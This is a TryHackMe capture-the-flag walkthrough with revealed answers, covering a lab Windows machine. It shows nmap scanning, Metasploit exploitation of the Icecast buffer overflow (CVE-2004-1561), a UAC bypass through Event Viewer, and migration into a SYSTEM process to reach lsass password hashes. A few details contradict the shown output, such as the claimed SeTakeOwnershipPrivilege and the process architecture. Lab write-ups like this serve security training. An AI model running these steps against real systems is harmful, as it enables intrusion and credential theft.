# ICE — TryHackMe Walkthrough

> Deploy & hack into a Windows machine, exploiting a very poorly secured media server.

<p align="center">
  <a href="https://imgbb.com/"><img src="https://i.ibb.co/nMwZmxXs/829892f5e7936a448f465b64d64f9c62.png" alt="829892f5e7936a448f465b64d64f9c62" border="0"></a> 
</p>

<p align="center">
  <a href="https://tryhackme.com/room/ice">
    <img src="https://img.shields.io/badge/TryHackMe-ICE-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Windows-blue">
  <img src="https://img.shields.io/badge/Focus-Enumeration%20%7C%20CVE%20Exploitation%20%7C%20PrivEsc-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | CVE-2004-1561 — Icecast 2.0.1 Buffer Overflow |
| 3 | Metasploit — `local_exploit_suggester` |
| 4 | Metasploit — `bypassuac_eventvwr` |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Perform a full port scan and identify services on a Windows machine
- Research a CVE and find the corresponding Metasploit module
- Use Metasploit to exploit a buffer overflow vulnerability and gain a Meterpreter shell
- Use the local exploit suggester to identify privilege escalation paths
- Bypass UAC using the Event Viewer method to gain elevated privileges
- Understand Windows privilege tokens and their significance

---

## Prerequisites

- Basic familiarity with Metasploit and Meterpreter
- Nmap installed on your attack machine

---

## Task 1 — Connect

Connect to the TryHackMe network using OpenVPN before proceeding. Download your configuration file from your [TryHackMe access page](https://tryhackme.com/access), then connect with:

```
sudo openvpn your-username.ovpn
```

> **Note:** This machine does not respond to ping (ICMP is disabled). This is common on Windows machines with the firewall configured to drop ICMP. Do not be alarmed if ping shows no response — the machine is still up. Always use Nmap with `-Pn` to skip the ping check when targeting Windows machines.

---

## Task 2 — Recon

### Question 1 — Launch a full port scan

**Approach:** Run a SYN scan across all 65535 ports with service and version detection enabled. Use `-sC` to run default scripts which can reveal additional service information.

```
sudo nmap -sS -sC -sV -p- ice
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 14:30 EDT
Nmap scan report for ice (Machine_IP)
Host is up (0.039s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http               Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:55:02:d5:d0:a9 (unknown)
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-09-14T13:36:35-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-09-14T18:36:35
|_  start_date: 2020-09-14T18:19:23

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 400.13 seconds
```

> **Note:** Several interesting ports are open. Port **3389** is Microsoft Remote Desktop (RDP), which could allow GUI remote access if credentials are obtained. Port **8000** is running **Icecast**, a streaming media server — this will be our attack vector. The machine is identified as **DARK-PC** running **Windows 7 SP1**, an older OS that is no longer supported and frequently vulnerable.

### Question 2 — What port is Microsoft Remote Desktop (MSRDP) running on?

<details>
<summary>Reveal Answer</summary>

**`3389`**

</details>

---

### Question 3 — What service is running on port 8000?

<details>
<summary>Reveal Answer</summary>

**`Icecast`**

</details>

---

### Question 4 — What is the hostname of the machine?

<details>
<summary>Reveal Answer</summary>

**`DARK-PC`**

</details>

---

## Task 3 — Gain Access

### Question 1 — What type of vulnerability does Icecast have?

**Approach:** Search for Icecast vulnerabilities at [cvedetails.com](https://www.cvedetails.com). Look for the entry with a CVSS score of 7.5 and note the vulnerability type.

> **Note:** The vulnerability is a **buffer overflow** in Icecast 2.0.1 that allows remote attackers to execute arbitrary code by sending 32 HTTP request headers. It is listed under the type "Execute Code Overflow" on CVE Details.

<details>
<summary>Reveal Answer</summary>

**`execute code overflow`**

</details>

---

### Question 2 — What is the CVE number for this vulnerability?

<details>
<summary>Reveal Answer</summary>

**`CVE-2004-1561`**

</details>

---

### Question 3 — Find the Metasploit module for Icecast

**Approach:** Launch Metasploit with `msfconsole`, then search for the Icecast exploit module.

```
msf5 > search icecast
```

> **Note:** Metasploit will return the module `exploit/windows/http/icecast_header`. Select it with `use icecast` or `use 0`.

<details>
<summary>Reveal Answer</summary>

**`exploit/windows/http/icecast_header`**

</details>

---

### Question 4 — What is the only required option that is currently blank?

**Approach:** After selecting the module, run `show options` to see what needs to be configured.

> **Note:** `RHOSTS` (Remote Host) must be set to the target machine IP. Also confirm that `LHOST` is set to your TryHackMe VPN IP (`tun0`). Then run `exploit` to launch the attack.

<details>
<summary>Reveal Answer</summary>

**`RHOSTS`**

</details>

---

## Task 4 — Escalate

### Question 1 — What type of shell do we have after exploitation?

> **Note:** Metasploit's Icecast exploit delivers a **Meterpreter** shell — an advanced in-memory payload that provides a rich set of post-exploitation commands without writing files to disk.

<details>
<summary>Reveal Answer</summary>

**`meterpreter`**

</details>

---

### Question 2 — What user was running the Icecast process?

**Approach:** Use the `getuid` command inside Meterpreter to identify the current user context.

```
meterpreter > getuid
```

```
Server username: Dark-PC\Dark
```

<details>
<summary>Reveal Answer</summary>

**`Dark`**

</details>

---

### Question 3 — What build of Windows is the system running?

**Approach:** Use the `sysinfo` command to retrieve system information.

```
meterpreter > sysinfo
```

```
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

> **Note:** The system is running a **64-bit** OS, but our Meterpreter shell is **x86** (32-bit). This mismatch is important — some post-exploitation modules work better when the architecture matches. The local exploit suggester will still work, but keep this in mind.

<details>
<summary>Reveal Answer</summary>

**`7601`**

</details>

---

### Question 4 — What is the architecture of the process we are running?

<details>
<summary>Reveal Answer</summary>

**`x64`**

</details>

---

### Question 5 — Run the local exploit suggester

**Approach:** Use Metasploit's built-in post-exploitation module to automatically check which local privilege escalation exploits this machine is vulnerable to.

```
meterpreter > run post/multi/recon/local_exploit_suggester
```

```
[*] Machine_IP - Collecting local exploits for x86/windows...
[*] Machine_IP - 30 exploit checks are being tried...
[+] Machine_IP - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] Machine_IP - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] Machine_IP - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] Machine_IP - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] Machine_IP - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] Machine_IP - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] Machine_IP - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] Machine_IP - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

> **Note:** The suggester returns multiple viable privilege escalation paths. This is expected on an unpatched Windows 7 machine. We will use the first result — `bypassuac_eventvwr` — which abuses the Windows Event Viewer to bypass User Account Control (UAC) and gain elevated privileges.

---

### Question 6 — What is the full path of the first returned exploit?

<details>
<summary>Reveal Answer</summary>

**`exploit/windows/local/bypassuac_eventvwr`**

</details>

---

### Question 7 — Background the current session and load the privilege escalation exploit

**Approach:** Background the current Meterpreter session with `background` (or `CTRL + Z`), then load and configure the UAC bypass module.

```
use exploit/windows/local/bypassuac_eventvwr
```

> **Note:** After loading the module, run `show options`. You will need to set `SESSION` to your current session number (likely `1`) and confirm `LHOST` is set to your VPN IP. Use `sessions` to list active sessions if needed.

---

### Question 8 — What option needs to be set to fix the listener IP?

<details>
<summary>Reveal Answer</summary>

**`LHOST`**

</details>

---

### Question 9 — Run the privilege escalation exploit

**Approach:** After setting all options, run the exploit. This may take a few attempts.

```
msf5 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 192.168.178.52:4444
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Cleaning up registry keys ...
[*] Exploit completed, but no session was created.
```

> **Note:** The output "no session was created" is normal on the first attempt — wait a moment and try again. Once successful, a new Meterpreter session will open. Switch to it with `sessions SESSION_NUMBER`.

---

### Question 10 — Interact with the new session and check privileges

**Approach:** Switch to the new elevated session, then run `getprivs` to list the enabled Windows privileges.

```
msf5 exploit(windows/local/bypassuac_eventvwr) > sessions 1
[*] Starting interaction with 1...

meterpreter >
```

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

> **Note:** `getprivs` lists the Windows privilege tokens available to the current process. **`SeTakeOwnershipPrivilege`** is the key one — it allows overriding file ownership, meaning we can take control of any file on the system, including those owned by SYSTEM or Administrator.

### Question 11 — What permission allows us to take ownership of files?

<details>
<summary>Reveal Answer</summary>

**`SeTakeOwnershipPrivilege`**

</details>

---

## Task 5 — Looting

### Step 1 — Migrate to a SYSTEM process

**Approach:** To interact with `lsass` (the Windows authentication service that holds password hashes), we need to be running inside a process that has SYSTEM-level privileges. List running processes with `ps`, identify one owned by `NT AUTHORITY\SYSTEM`, then migrate into it with `migrate PID`.

> **Note:** Good candidates for migration are stable, long-running SYSTEM processes such as `spoolsv.exe` (the print spooler) or `winlogon.exe`. Avoid migrating into short-lived processes as the session may drop. Once migrated, commands like `hashdump` will work with full authority.

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap full port scan | Found Icecast on port 8000, RDP on 3389, Windows 7 SP1 |
| 2 | CVE research | Identified CVE-2004-1561 — buffer overflow in Icecast 2.0.1 |
| 3 | Metasploit `icecast_header` exploit | Gained Meterpreter shell as user `Dark` |
| 4 | `sysinfo` / `getuid` | Confirmed x64 Windows 7 build 7601, x86 shell |
| 5 | `local_exploit_suggester` | Identified `bypassuac_eventvwr` as a viable escalation path |
| 6 | `bypassuac_eventvwr` exploit | Bypassed UAC and gained elevated Meterpreter session |
| 7 | `getprivs` | Confirmed `SeTakeOwnershipPrivilege` among enabled tokens |
| 8 | Process migration | Moved into a SYSTEM process to interact with `lsass` |
